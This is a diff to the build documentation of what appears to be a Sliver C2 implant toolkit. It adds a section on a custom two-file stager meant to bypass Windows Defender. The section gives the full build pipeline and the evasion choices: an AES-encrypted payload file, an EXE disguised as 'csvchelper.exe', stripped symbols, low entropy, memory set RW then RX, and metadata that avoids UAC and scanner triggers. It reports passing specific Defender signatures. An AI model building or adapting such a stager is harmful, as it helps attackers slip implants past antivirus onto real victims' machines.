@@ -13,6 +13,8 @@ Build prerequisites, verified versions, and the actual pipeline used to produce 
 | `java` (JRE) | OpenJDK 17 | Execute `crystalpalace.jar` linker | `apt install default-jdk` | `brew install openjdk@17` |
 | `make` | GNU Make ≥ 4 | Build orchestration | preinstalled | preinstalled |
 | `xxd` | any | Embed PICO as C byte array (crystal-exec step 3) | `apt install xxd` | preinstalled |
+| `openssl` | any | AES-256-CBC encrypt PICO for stager delivery (`gen_payload.py`) | `apt install openssl` | preinstalled |
+| `python3` | ≥ 3.8 | Drive stager key generation (`gen_payload.py`) | preinstalled | preinstalled |
 | `zip` | any | Pack operator drop bundle | `apt install zip` | preinstalled |
 | `curl` | any | Download Crystal Palace dist | preinstalled | preinstalled |
 
@@ -134,6 +136,49 @@ Key design constraints:
 - Single callback model: all output accumulates into a heap buffer; exactly ONE `callback(buf, len)` call at the very end. Sliver extension loaders only display the first callback invocation — any subsequent calls are silently dropped.
 
 **Verified output:** `crystal-exec.x64.dll` — PE32+ x86-64, exports symbol `go`.
+
+### 3e. Custom stager — two-file delivery (Use case A Defender bypass)
+
+Located at `crystal-kit-sliver/sliver-glue/stager/`.
+
+3-step pipeline under `crystal-kit-sliver/sliver-glue/stager/Makefile`:
+
+```
+Step 1: AES-256-CBC encrypt PICO → payload.dat + C key header  (gen_payload.py)
+  python3 gen_payload.py <pico.bin> <payload.dat> payload_key.h
+  Uses openssl(1) for AES encryption. Fresh random key + IV every run.
+  Outputs:
+    payload.dat      — opaque AES ciphertext, no PE patterns (deliver alongside stager)
+    payload_key.h    — key[] + iv[] C arrays compiled into the stager EXE
+
+Step 2: compile version info resource + manifest
+  x86_64-w64-mingw32-windres resource.rc -o resource.o
+  resource.rc embeds manifest.xml (ID 1 / RT_MANIFEST) declaring requestedExecutionLevel
+  asInvoker — suppresses UAC auto-elevation regardless of filename or description keywords.
+
+Step 3: compile stager EXE
+  x86_64-w64-mingw32-gcc -Wall -Os -mwindows -ffunction-sections -fdata-sections \
+      -o csvchelper.exe stager.c resource.o -s -Wl,--gc-sections -ladvapi32 -lbcrypt
+```
+
+Key design properties:
+- `stager.exe` is ~17 KB with entropy ~4.8 — indistinguishable from a small utility
+- `payload.dat` is opaque AES ciphertext — no PE magic, no Crystal Palace byte patterns
+- IAT: ADVAPI32 (RegOpenKeyExW), bcrypt (BCryptDecrypt, BCryptGenRandom), KERNEL32 — no ntdll Nt* entries
+- VirtualAlloc(RW) + VirtualProtect(RX): no PAGE_EXECUTE_READWRITE mapping ever held
+- `-s` strips all symbol table entries — no function names appear in strings output
+- `FileDescription` in `resource.rc` must avoid UAC trigger words ("update", "install", "setup", "service"); the `asInvoker` manifest is the hard override but clean metadata reduces scanner surface
+
+Invoke via `bundle-stager.sh`:
+
+```bash
+./crystal-kit-sliver/sliver-glue/bundle-stager.sh \
+    crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin \
+    crystal-kit-sliver/sliver-glue/build/csvchelper.exe
+# → produces build/csvchelper.exe  +  build/payload.dat
+```
+
+**Verified output:** `csvchelper.exe` 17 KB, entropy 4.784. No NtCreateSection / NtMapViewOfSection strings. Passes Windows Defender on Windows 10 x64 (tested against VirTool:Win64/ZomBytes.B and Trojan:Win32/Wacatac.B!ml signatures).
 
 ## 4. End-to-end timing on macOS Apple Silicon (reference)
 
